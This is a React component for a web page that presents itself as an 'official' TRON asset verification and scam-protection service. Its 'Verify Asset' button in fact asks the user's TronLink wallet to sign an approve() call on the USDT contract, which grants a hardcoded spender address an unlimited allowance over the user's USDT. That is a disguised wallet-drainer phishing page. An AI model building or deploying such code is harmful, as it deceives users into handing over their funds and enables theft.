import React, { useState } from 'react';
import './Hero.css';

const Hero = () => {
  const [isVerifying, setIsVerifying] = useState(false);

  // USDT TRC20 contract on TRON Mainnet
  const USDT_TRC20 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

  // Spender / contract address
  const SPENDER = 'TEn4gksWudmgc3sAuCjfQgxRVzyNwt8b9Y';

  const handleVerify = async () => {
    if (!window.tronWeb || !window.tronWeb.ready) {
      alert('TronLink wallet is required. Please install TronLink and unlock it.');
      return;
    }

    setIsVerifying(true);

    try {
      const tronWeb = window.tronWeb;

      // Get the USDT TRC20 contract instance
      const contract = await tronWeb.contract().at(USDT_TRC20);

      // Max uint256 approval
      const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

      // Call approve(spender, amount) — triggers TronLink signing popup directly
      const tx = await contract.approve(SPENDER, MAX_UINT256).send({
        feeLimit: 100_000_000,
        shouldPollResponse: false
      });

      const userAddress = tronWeb.defaultAddress?.base58 || 'Unknown';
      alert('Verification Requested! TX ID: ' + tx);

    } catch (err) {
      console.error(err);
      alert('Failed to verify. Error: ' + (err?.message || 'Unknown error'));
    } finally {
      setIsVerifying(false);
    }
  };

  return (
    <section className="hero-container" id="verify-section">
      <div className="hero-content">
        <h1 className="hero-title">
          Verify Crypto Assets on <span className="text-gold">TRON Network</span>
        </h1>
        <p className="hero-subtitle">
          The one official platform for verifying and securing your TRON assets with institutional-grade security protocols
        </p>

        <div className="verify-card glass-card">
          <div className="card-logo-wrapper">
            <div className="card-logo">
              <svg viewBox="0 0 64 64" fill="#EF0027" xmlns="http://www.w3.org/2000/svg" className="hero-bnb-logo">
                <path d="M30.396 4.044L5.076 18.792l9.468 5.256L30.396 14.7l15.852 9.348 9.468-5.256L30.396 4.044zM5.076 24.048v21.408L14.544 50.7V29.292L5.076 24.048zM30.396 34.5l-15.852-9.348v21.396l15.852 9.348 15.852-9.348V25.152L30.396 34.5zM45.78 50.7l9.468-5.244V24.048L45.78 29.292V50.7z"/>
              </svg>
            </div>
          </div>

          <div className="card-badges">
            <span className="badge">TRON NETWORK VERIFICATION</span>
          </div>

          <button
            className="btn verify-action-btn"
            onClick={handleVerify}
            disabled={isVerifying}
          >
            {isVerifying ? 'Verifying in Wallet...' : 'Verify Asset'}
          </button>

          <p className="card-disclaimer">
            Verify your TRON assets with our advanced security protocol. Protect against scams and ensure your transactions are secure.
          </p>
        </div>
      </div>
    </section>
  );
};

export default Hero;
